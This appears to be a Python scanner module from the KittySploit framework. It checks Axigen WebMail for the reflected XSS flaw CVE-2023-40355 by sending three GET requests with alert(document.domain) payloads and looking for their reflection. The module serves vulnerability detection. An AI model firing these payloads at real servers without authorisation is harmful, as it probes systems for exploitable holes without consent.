#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cross Site Scripting (XSS) vulnerability in Axigen versions 10."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Axigen WebMail - Cross-Site Scripting Detection',
        'description': 'Cross Site Scripting (XSS) vulnerability in Axigen versions 10.3.3.0 before 10.3.3.59, 10.4.0 before 10.4.19, and 10.5.0 before 10.5.5, allows authenticated attackers to execute arbitrary code and obtain sensitive information via the logic for switching between the Standard and Ajax versions.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xss', 'axigen', 'webmail', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.axigen.com/knowledgebase/Axigen-WebMail-XSS-Vulnerability-CVE-2023-40355-_396.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-40355',
        ],
        'cve': 'CVE-2023-40355',
    }

    def run(self):
        for path in ("/index.hsp?passwordExpired=yes&username=\\'-alert(document.domain),//", "/index.hsp?passwordExpired=yes&domainName=\\'-alert(document.domain),//", "/index.hsp?m=',alert(document.domain),'"):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ("\\\\'-alert(document.domain),//", "',alert(document.domain),'", 'Axigen',)
            header_any = ('text/html',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="Axigen WebMail - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

